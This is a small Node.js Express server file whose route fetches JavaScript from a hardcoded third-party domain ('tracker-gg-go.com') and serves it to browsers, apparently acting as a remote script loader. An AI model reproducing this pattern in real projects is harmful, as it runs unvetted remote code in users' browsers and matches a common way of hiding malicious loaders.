// server.js (Node.js backend)
const express = require('express');
const axios = require('axios'); // To make HTTP requests
const app = express();
const port = 3000;

// Route to serve the remote JS file
app.get('/serve-script', async (req, res) => {
    try {
        // Fetch the remote JS file (replace with the actual URL)
        const remoteFileUrl = 'https://app.tracker-gg-go.com/link1/?api';
        const response = await axios.get(remoteFileUrl);

        // Set the correct content type for JS
        res.setHeader('Content-Type', 'application/javascript');
        res.send(response.data);  // Send the fetched JS to the client
    } catch (error) {
        console.error('Error fetching remote file:', error);
        res.status(500).send('Error fetching remote file');
    }
});

//  Serve static assets (for your front-end files)
app.use(express.static('public'));

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
